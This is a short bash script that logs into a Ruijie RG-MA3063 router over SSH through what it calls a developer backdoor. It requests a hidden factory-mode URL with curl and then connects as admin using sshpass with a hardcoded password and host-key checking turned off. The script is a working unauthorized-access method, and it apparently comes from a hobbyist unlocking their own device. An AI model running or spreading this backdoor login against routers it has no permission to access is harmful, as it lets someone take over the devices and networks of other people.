#!/usr/bin/env bash
# try login into Ruijie RG-MA3063 router via SSH using developer backdoor.
# for more info, see https://blog.kokomi.me/posts/enable-ssh-for-rg-ma3063

curl http://192.168.10.1/__factory_verify_mode__
sshpass -p wifi@cmcc ssh 192.168.10.1 -l admin -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no
